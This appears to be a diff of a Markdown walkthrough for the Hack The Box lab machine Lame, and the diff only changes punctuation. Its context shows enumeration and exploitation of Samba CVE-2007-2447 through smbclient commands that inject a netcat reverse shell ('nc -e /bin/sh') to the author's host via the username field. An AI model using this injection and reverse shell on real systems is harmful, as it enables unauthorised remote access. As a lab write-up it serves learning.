@@ -2,7 +2,7 @@
 
 This is my write-up/walkthrough for [the Hack The Box machine, Lame](https://app.hackthebox.com/machines/Lame). It's a Linux machine, rated "Easy", with 10.10.10.3 as its IP address.
 
-I started with an nmap scan——
+I started with an nmap scan—
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
@@ -63,7 +63,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 83.22 seconds
 ```
 
-——that told me I have port 21 (FTP), port 22 (SSH), port 139 (NetBIOS), and port 445 (SMB) to work with. Anonymous login is allowed for FTP, so my first instinct was to use that and see if it gets us somewhere.
+—that told me I have port 21 (FTP), port 22 (SSH), port 139 (NetBIOS), and port 445 (SMB) to work with. Anonymous login is allowed for FTP, so my first instinct was to use that and see if it gets us somewhere.
 
 
 ```
@@ -173,7 +173,7 @@ While that `print$` share wasn't useful, `tmp` looked promising. I got one file,
 
 I spent some time googling what this "`VGAuthService`" is, what this log file is telling us, etc., but all in vain. This wasn't the way to approach the problem. I realised that when, frustated I wasn't getting anywhere on this "easy" machine, I noticed the "`lame server (Samba 3.0.20-Debian)`" next to the IPC-type shares in the output of that `smbclient -L` command run.
 
-Ran a searchsploit for "samba 3.0"——
+Ran a searchsploit for "samba 3.0"—
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
@@ -197,29 +197,29 @@ Samba < 3.6.2 (x86) - Denial of Service (PoC)                                   
 Shellcodes: No Results
 ```
 
-——and voilà!
+—and voilà!
 
 That "'Username' map script' Command Execution" looked interesting, so I started reading more on that –  which lead me to [CVE-2007-2447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447). "[...] allows remote attackers to execute arbitrary commands via shell". Perfect.
 
 I looked it up in Rapid7's Vulnerability & Exploit Database and got a simplied explaination of what makes this vulnerability tick. Apparently, passing a username containing shell meta characteres confuses one of the functions that calls external scripts defined in config. Or something like that. [Here](https://www.samba.org/samba/security/CVE-2007-2447.html) is Samba's blog for this vulnerability on their product and [here](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/) is Rapid7's explaination of it.
 
-I didn't want to use Metasploit on this and just be done with it, though looking at that Rapid7 page, that does seem to be the easiest way to pwn this box. [Line 74](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/samba/usermap_script.rb#L74) of source code linked on that page did give me an idea, though. I was hoping something like the following would work——
+I didn't want to use Metasploit on this and just be done with it, though looking at that Rapid7 page, that does seem to be the easiest way to pwn this box. [Line 74](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/samba/usermap_script.rb#L74) of source code linked on that page did give me an idea, though. I was hoping something like the following would work—
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ smbclient -N \\\\10.10.10.3\\ADMIN$ -U './=`nohup nc -e /bin/sh 10.10.16.4 1234`'       
 session setup failed: NT_STATUS_LOGON_FAILURE
 ```
-——but that didn't seem to be the case. Here, "nc -e /bin/sh 10.10.16.4 1234" is the payload. I was trying to get a reverse shell on my machine (10.10.16.4), on the specified port (1234), but for reasons beyond me, it was wasn't working. Until, that is, I stumbled upon [this](https://askubuntu.com/questions/109507/smbclient-getting-nt-status-logon-failure-connecting-to-windows-box) useful discussion over at the Stack Exchange forums.
+—but that didn't seem to be the case. Here, "nc -e /bin/sh 10.10.16.4 1234" is the payload. I was trying to get a reverse shell on my machine (10.10.16.4), on the specified port (1234), but for reasons beyond me, it was wasn't working. Until, that is, I stumbled upon [this](https://askubuntu.com/questions/109507/smbclient-getting-nt-status-logon-failure-connecting-to-windows-box) useful discussion over at the Stack Exchange forums.
 
-Modified my command to the following——
+Modified my command to the following—
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ smbclient -N \\\\10.10.10.3\\ADMIN$ -U DOMAIN/'./=`nohup nc -e /bin/sh 10.10.16.4 1234`'
 ```
 
-——while I had `nc` listening for connections on port 1234 on another terminal.
+—while I had `nc` listening for connections on port 1234 on another terminal.
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
